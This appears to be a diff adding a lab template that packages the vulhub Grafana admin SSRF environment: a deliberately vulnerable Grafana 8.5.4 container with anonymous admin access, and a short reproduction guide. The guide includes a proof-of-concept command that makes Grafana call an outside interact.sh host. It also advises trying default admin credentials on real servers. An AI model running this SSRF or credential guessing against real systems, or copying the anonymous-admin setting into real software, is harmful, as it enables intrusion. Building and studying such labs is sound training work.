@@ -1,0 +1,91 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-grafana-admin-ssrf
+  name: Grafana Management Background SSRF
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - grafana
+  description: Grafana — Grafana Management Background SSRF (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/grafana/admin-ssrf
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/grafana/admin-ssrf
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - grafana
+    - ssrf
+    difficulty: medium
+    summary: Grafana Management Background SSRF
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/grafana/admin-ssrf
+        Grafana is a multi-platform open source analytics and interactive visualization web application.
+        The admin user is able to make requests to an unintended location in all versions of Grafana.
+        References:
+        - <https://github.com/RandomRobbieBF/grafana-ssrf>
+        # Vulnerable environment
+        Execute following command to start a Grafana 8.5.4:
+        $ docker compose up -d
+        Then you can see the portal page for Grafana without the authentication in `http://your-ip:3000`, because this server enabled the anonymous as admins by:
+        $ [auth.anonymous]
+        $ enabled = true
+        $ org_role = Admin
+        If Grafana ask you for user credentials in real world, can try default `admin` and `admin`.
+        # Vulnerability Reproduce
+        Use this POC (https://github.com/RandomRobbieBF/grafana-ssrf) to reproduce the SSRF:
+        $ python grafana-ssrf.py -H http://your-ip:3000 -u http://example.interact.sh/attack
+        As you can see, I got the request from Grafana:
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/grafana/admin-ssrf
+        Grafana is a multi-platform open source analytics and interactive visualization web application.
+        The admin user is able to make requests to an unintended location in all versions of Grafana.
+        References:
+        - <https://github.com/RandomRobbieBF/grafana-ssrf>
+        # Vulnerable environment
+        Execute following command to start a Grafana 8.5.4:
+        $ docker compose up -d
+        Then you can see the portal page for Grafana without the authentication in `http://your-ip:3000`, because this server enabled the anonymous as admins by:
+        $ [auth.anonymous]
+        $ enabled = true
+        $ org_role = Admin
+        If Grafana ask you for user credentials in real world, can try default `admin` and `admin`.
+        # Vulnerability Reproduce
+        Use this POC (https://github.com/RandomRobbieBF/grafana-ssrf) to reproduce the SSRF:
+        $ python grafana-ssrf.py -H http://your-ip:3000 -u http://example.interact.sh/attack
+        As you can see, I got the request from Grafana:
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_3000
+    group:
+      fr: Accès
+      en: Access
+    label: web 3000/tcp
+    type: port
+    default: 3000
+services:
+  web:
+    role: main
+    image: vulhub/grafana
+    tag: 8.5.4@sha256:d45fa429d9aa5263eb856c31f1fb252ad4f1386bd0ae3097aa0c189ef53fd509
+    frozen: true
+    ports:
+    - container: 3000
+      host: '{{ form.port_3000 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_3000 }}
